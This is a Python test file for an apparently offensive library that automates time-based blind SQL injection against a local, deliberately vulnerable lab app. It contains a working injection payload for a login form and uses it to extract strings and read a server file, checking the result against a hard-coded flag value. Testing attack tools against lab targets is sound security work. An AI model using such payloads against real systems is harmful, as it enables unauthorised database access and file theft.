import logging
import requests
from unittest import TestCase
from pyic import BlindStringFinder, SqliEncoder, TimeBlindTester

logging.basicConfig(level=logging.DEBUG)


class TestBlindStringFinder(TestCase):
    """
    This test need the docker sqli in https://github.com/NeuronAddict/vulnerable-apps.git running
    """

    def setUp(self):
        self.tester = TimeBlindTester(
            lambda payload: requests.post('http://127.0.0.1:8181/login.php', data={'login': 'admin',
                                                                                   'pass': "' OR ( ({}) AND sleep(1) ) #".format(
                                                                                       payload)}),
            0.5, 1
        )

        self.string_finder = BlindStringFinder(self.tester)

    def test_false_serie(self):

        self.assertFalse(self.tester.test('1=0'))

        self.assertTrue(self.tester.test('1=1'))

        self.assertEqual(self.string_finder.str_length("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou'))),
                         6)

        self.assertEqual(self.string_finder.read_string("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou'))),
                         'coucou')

        self.assertEqual(self.string_finder.read_file('/var/www/html/flag.txt'), 'dee8cha8moh9ahyeM4atheemi\n')
